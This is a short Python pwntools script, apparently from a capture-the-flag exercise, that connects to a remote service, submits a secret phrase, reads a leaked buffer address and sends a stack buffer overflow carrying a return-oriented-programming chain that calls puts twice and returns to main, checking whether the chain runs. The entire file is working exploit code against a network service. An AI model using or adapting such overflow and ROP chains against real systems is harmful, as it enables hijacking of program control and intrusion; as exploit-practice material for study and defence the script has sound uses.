#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

r = remote('154.57.164.77', 32702)
r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
r.recvuntil(b'[0x')
buf_leak = int(r.recvuntil(b']')[:-1], 16)
print(f'buf_leak: {hex(buf_leak)}')
r.recvuntil(b'wish for next year: ')

pop_rdi = 0x4011f2
pop_rsi_r15 = 0x401519

# Simple chain: puts + puts (same gadget twice)
payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(0x402041)     # "Spooktober!!!"
payload += p64(0x401040)     # puts@plt
payload += p64(pop_rdi)
payload += p64(0x402041)
payload += p64(0x401040)     # puts@plt again
payload += p64(0x401393)     # main
print(f'Payload: {len(payload)} bytes')
r.send(payload)

try:
    data = r.recv(timeout=5)
    print(f'Data ({len(data)}B): {data[:500]}')
    count = data.count(b'Spooktober')
    print(f'Spooktober count: {count}')
    if count >= 2:
        print('Double puts chain works!')
except Exception as e:
    print(f'Error: {e}')
r.close()
